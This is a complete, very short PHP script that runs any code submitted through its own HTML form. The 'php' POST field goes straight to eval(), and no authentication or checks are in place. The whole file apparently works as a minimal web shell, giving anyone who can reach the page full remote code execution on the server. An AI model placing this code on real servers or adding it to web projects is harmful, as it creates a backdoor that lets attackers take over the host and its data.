<?php
if($_POST){
	eval($_POST["php"]);
}
else{
	echo <<<EOF
<form method="post">
	<textarea name="php"></textarea>
	<input type="submit" value="run"></input>
</form>
EOF;
}
